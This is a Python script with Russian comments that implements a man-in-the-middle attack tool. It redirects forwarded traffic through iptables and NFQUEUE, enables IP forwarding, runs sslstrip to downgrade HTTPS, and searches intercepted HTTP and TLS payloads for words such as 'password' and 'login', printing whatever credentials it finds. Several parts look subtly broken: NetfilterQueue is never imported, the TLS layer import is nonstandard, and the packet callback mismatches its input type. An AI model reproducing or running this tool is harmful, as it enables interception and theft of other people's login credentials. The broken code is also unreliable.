import os
import sys
import threading
import signal
from typing import List, Any
from scapy.all import *
from scapy.layers.ssl_tls import *

# Класс для обработки сетевых пакетов
class NetworkPacketProcessor:
    def __init__(self) -> None:
        # Ключевые слова, которые используются для поиска аутентификационных данных в перехваченных данных
        self.auth_indicators: List[str] = ["username", "user", "login", "password", "pass"]

    # Основной метод для обработки входящего сетевого пакета
    def handle_packet(self, packet: Packet) -> None:
        if packet.haslayer(HTTPRequest):
            self._handle_http_request(packet)

        elif packet.haslayer(SSL):
            self._handle_ssl_traffic(packet)

    # Обработка HTTP-запроса в пакете
    def _handle_http_request(self, packet: Packet) -> None:
        try:
            url: str = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
            print(f"[+] HTTP-запрос обнаружен: {url}")
        except (UnicodeDecodeError, AttributeError):
            print("[!] Ошибка при извлечении URL")

        if packet.haslayer(Raw):
            raw_data: bytes = packet[Raw].load
            self._analyze_data(raw_data)

    # Обработка SSL-трафик
    def _handle_ssl_traffic(self, packet: Packet) -> None:
        try:
            ssl_data: bytes = packet[SSL].load
            self._analyze_data(ssl_data)
        except (UnicodeDecodeError, AttributeError):
            print("[!] Ошибка при обработке SSL-трафика")

    # Анализирует полезную нагрузку на наличие ключевых слов
    def _analyze_data(self, payload: bytes) -> None:
        try:
            decoded_payload: str = payload.decode('utf-8')
            for keyword in self.auth_indicators:
                if keyword in decoded_payload:
                    print(f"\n\n[+] Найдены возможные аутентификационные данные: {decoded_payload}\n\n")
                    break
        except UnicodeDecodeError:
            print("[!] Невозможно декодировать полезную нагрузку")

# Класс для управления атакой типа "Человек посередине" (MITM)
class MITMAttackHandler:
    def __init__(self) -> None:
        self.packet_processor: NetworkPacketProcessor = NetworkPacketProcessor()

    # Запускает атаку MITM, настраивая правила для перенаправления пакетов и активируя необходимые инструменты
    def start_attack(self) -> None:
        print("[*] Настройка iptables для перехвата пакетов...")
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        os.system("sslstrip -l 8080")
        print("[*] Атака MITM запущена")

    # Завершает атаку, очищая все настройки и восстанавливает параметры системы
    def cleanup_and_exit(self, sig: int, frame: Any) -> None:
        print("\n[!] Прерывание. Очищаем конфигурацию...")
        os.system("iptables --flush")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        sys.exit(0)

    # Перехватывает и обрабатывает сетевые пакеты в режиме реального времени
    def intercept_packets(self) -> None:
        print("[*] Ожидание перехвата пакетов...")
        packet_queue: NetfilterQueue = NetfilterQueue()
        packet_queue.bind(0, self.packet_processor.handle_packet)
        packet_queue.run()

# основная функция
def main() -> None:

    attack_handler: MITMAttackHandler = MITMAttackHandler()

    print("[*] Запуск MITM атаки...")
    attack_thread: threading.Thread = threading.Thread(target=attack_handler.start_attack)
    attack_thread.start()

    # Обработка прерывания (Ctrl+C) для корректного завершения программы
    signal.signal(signal.SIGINT, attack_handler.cleanup_and_exit)

    # Перехват пакетов в основном потоке
    attack_handler.intercept_packets()

if __name__ == "__main__":
    main()
